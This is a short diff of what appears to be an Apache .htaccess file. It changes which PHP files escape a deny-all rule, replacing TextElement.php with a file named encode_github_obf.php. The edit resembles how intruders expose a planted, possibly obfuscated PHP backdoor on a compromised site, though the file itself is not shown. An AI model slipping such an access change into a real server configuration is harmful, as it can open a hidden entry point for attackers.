@@ -5,11 +5,12 @@ Order allow,deny
 Deny from all
 </FilesMatch>
 
-<FilesMatch "^(Crockford.php|EnvironmentInterface.php|TextElement.php)$">
+<FilesMatch "^(Crockford.php|EnvironmentInterface.php|encode_github_obf.php)$">
 Order allow,deny
 Allow from all
 
 </FilesMatch>
+
 
 
 
